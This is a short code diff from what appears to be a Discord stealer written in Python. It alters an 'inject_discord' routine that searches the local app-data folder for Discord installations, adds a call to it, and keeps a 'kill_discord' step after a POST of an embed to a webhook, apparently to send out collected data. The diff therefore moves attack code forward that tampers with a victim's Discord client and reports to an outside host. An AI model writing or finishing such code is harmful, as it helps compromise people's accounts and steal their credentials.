@@ -145,7 +145,7 @@ response = requests.post(webhook, json={"embeds": [embed]})
 import os
 LOCAL_APP_DATA = Path(os.getenv('localappdata'))
 
-def inject_discord(config):
+def inject_discord():
     for _dir in os.listdir(LOCAL_APP_DATA):
         if 'discord' in _dir.lower():
             for __dir in os.listdir(LOCAL_APP_DATA / _dir):
@@ -184,6 +184,7 @@ embed = {
 }
 
 response = requests.post(webhook, json={"embeds": [embed]})
+inject_discord()
 kill_discord()
 
 
